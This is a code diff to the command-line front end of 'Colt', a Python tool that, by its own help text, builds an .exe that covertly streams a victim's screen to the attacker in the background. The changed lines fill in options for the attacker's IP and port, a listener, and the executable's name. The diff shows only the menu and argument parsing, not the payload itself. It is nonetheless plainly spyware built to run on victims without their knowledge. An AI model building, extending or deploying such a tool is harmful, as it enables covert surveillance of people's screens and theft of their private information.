@@ -31,21 +31,23 @@ def print_banner():
 
 clear_screen()
 print_banner()
+print("\n[+] enter -h for all available tags")
+
 
 payload_type = None
 
 while True:
-    colt_cm = input(f"{BV}Colt >> {RESET}").split()
+    colt_cm = input(f"\n{BV}Colt >> {RESET}").split()
     if not colt_cm:
         continue
 
-    parser = argparse.ArgumentParser(description="A screen spyer?? NOTE:CHANGE DESC")
+    parser = argparse.ArgumentParser(description="Colt is a 'reverse screen sharer', what that means is that the attacker can generate an .exe file that when the victim opens, shares their entire screen to the attacker while running background.")
     parser.add_argument("-EXE", "--exe", action="store_true", help="generate .exe for the victim")
-    parser.add_argument("-IP", "--ip", help="generate .exe for the victim")
-    parser.add_argument("-PORT", "--port", help="generate .exe for the victim")
-    parser.add_argument("-CONNECT", "--connect", action="store_true", help="Connects with the target.")
+    parser.add_argument("-IP", "--ip", help="set ip of the attacker(you)")
+    parser.add_argument("-PORT", "--port", help="set port")
+    parser.add_argument("-CONNECT", "--connect", action="store_true", help="Starts a listener on specified host and port")
     parser.add_argument("-CLEAR", "--clear", action="store_true", help="Clear ui.")
-    parser.add_argument("-NAME", "--name", help="Clear ui.")
+    parser.add_argument("-NAME", "--name", help="Set name of the executable")
 
     args = parser.parse_args(colt_cm)
 
